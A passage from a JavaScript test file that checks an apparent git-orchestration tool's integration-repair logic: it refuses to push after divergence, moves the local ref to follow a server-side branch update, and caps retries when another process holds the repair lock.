      if (args[0] === "push") pushes.push(args);
      return git.gitTry(args, wd);
    },
  };

  const out = await runRepair(repo, {
    branch: "feature",
    landing: "pr",
    gitDep,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.match(out.result.reason, /diverged from the repaired tip/);
  assert.deepEqual(pushes, [], "nothing may be pushed once the local ref is known to have diverged");
  assert.equal(originSha(remote, "feature"), before);
});

test("integration repair: a red gate after update-branch still advances the local ref", async () => {
  // `updateBranch` moves ORIGIN before anything is gated, so the local ref is
  // stale from that moment on. Left there, `resolveLanded`'s `expectedHead`
  // points at the pre-update sha and the next readiness read is REMOTE_UNKNOWN
  // — a class with no repair path, so the branch can never be repaired again.
  const { repo, remote } = conflictFixture();
  git.git(["switch", "-c", "feature", "orch/integration"], repo);
  git.git(["push", "-u", "origin", "feature"], repo);
  git.git(["switch", "main"], repo);
  const stale = git.git(["rev-parse", "feature"], repo);
  const peer = cloneRemote(remote);
  git.git(["switch", "feature"], peer);
  git.git(["merge", "--no-edit", "-X", "theirs", "origin/main"], peer);
  const gh = (args) => {
    if (args[0] === "api") { git.git(["push", "origin", "feature"], peer); return "{}"; }
    return "";
  };

  const out = await runRepair(repo, {
    branch: "feature",
    landing: "pr",
    failureClass: "REMOTE_BEHIND",
    gh,
    gate: { detect: () => "true", run: () => ({ pass: false, log: "red" }) },
  });

  assert.match(out.result.reason, /gate red/);
  assert.notEqual(git.git(["rev-parse", "feature"], repo), stale);
  assert.equal(
    git.git(["rev-parse", "feature"], repo),
    originSha(remote, "feature"),
    "the local ref must follow the server-side update even when the gate then fails",
  );
});

test("integration repair: lock contention stops at the retry cap instead of spinning the controller", async () => {
  const { repo } = conflictFixture();
  const orchDir = join(repo, ".orch");
  mkdirSync(orchDir, { recursive: true });
  writeFileSync(join(orchDir, LOCK_NAMES.INTEGRATION_REPAIR), String(process.pid));
  const slept = [];

  // Round 3 of 3: still handed back, and the wait is counted.
  const third = await runRepair(repo, {
    record: { attempt: 1, failures: [], retries: { "repair-lock-wait": 2 } },
    sleep: async (ms) => slept.push(ms),
  });
  assert.equal(third.cycle?.status, "merged");
  assert.equal(third.result, undefined);
  assert.equal(third.record.retries["repair-lock-wait"], 3);
  assert.equal(third.record.attempt, 0);

  // Round 4: the cap is spent. Terminal, naming the peer — not another refund
  // that leaves run-controller.js to burn its 32 loops on contention alone.
  const fourth = await runRepair(repo, {
    record: { attempt: 1, failures: [], retries: { "repair-lock-wait": 3 } },
    sleep: async (ms) => slept.push(ms),
  });
  assert.equal(fourth.cycle, undefined);
  assert.equal(fourth.result.state, "STOPPED_AT_CAP");
  assert.match(fourth.result.reason, /a peer is already repairing/);
  assert.deepEqual(slept, [60_000], "the exhausted round must not back off again");
});
